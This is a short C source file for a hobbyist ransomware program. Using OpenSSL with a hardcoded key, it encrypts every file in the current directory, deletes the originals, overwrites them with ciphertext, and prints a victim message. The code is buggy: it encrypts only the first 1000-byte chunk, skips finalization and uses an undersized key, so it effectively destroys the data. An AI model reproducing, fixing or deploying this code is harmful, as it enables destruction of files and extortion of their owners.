 #include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<dirent.h>
#include<string.h>
#include<openssl/evp.h>


#define RED     "\033[31m"
#define RESET   "\033[0m"


int encryptfile(const char *input_file,const char *key){

OpenSSL_add_all_algorithms();

FILE *in_file = fopen(input_file,"rb");

if(in_file == NULL){
 printf(RED "Somthing Went Wrong While Trying To Open the Files \n" RESET);
 return -1;
}

EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();

int handle_ctx_error(){
printf(RED"Something Went Wrong While Trying To Create/Initialize Encryption Context \n" RESET);
fclose(in_file);
return -1;
}


if(ctx == NULL) return handle_ctx_error();

if(EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, (const unsigned char *) key, NULL) != 1){
return handle_ctx_error();
}

unsigned char buffer[1000];
int bytes_written;
int bytes_read = fread(buffer,1,sizeof(buffer),in_file);

while(bytes_read > 0){
if(EVP_EncryptUpdate(ctx,buffer,&bytes_written,buffer, bytes_read) != 1){
printf( RED "Something Went Wrong Wile Trying To Encrypt Data \n " RESET );
EVP_CIPHER_CTX_free(ctx);
fclose(in_file);

return -1;
}

fclose(in_file);
remove(input_file);

FILE * out_file = fopen(input_file,"wb");
fwrite(buffer,1,bytes_written,out_file);


EVP_CIPHER_CTX_free(ctx);
fclose(out_file);
return 0;
}
}



void main(int argc, char *argv[]){


const char *input_file;
int test;
const char *key ="A,nu0B/Dic@*ù5ss";
DIR *dir = opendir(".");


struct dirent* in_file;
in_file = readdir(dir);


while((in_file != NULL)){
 
 input_file = (const char*) in_file->d_name;
 //printf(" File %s is being encrypted \n",in_file->d_name);
 test = encryptfile(input_file, key);
 in_file = readdir(dir);
}

closedir(dir);


if(test == 0) printf(RED " !!!!!!!!!!!! YOU HAVE BEEN A VICTIM OF A RANSOMWARE !!!!!!!!! \n " RESET);
else printf("something went wrong in your code \n");
}
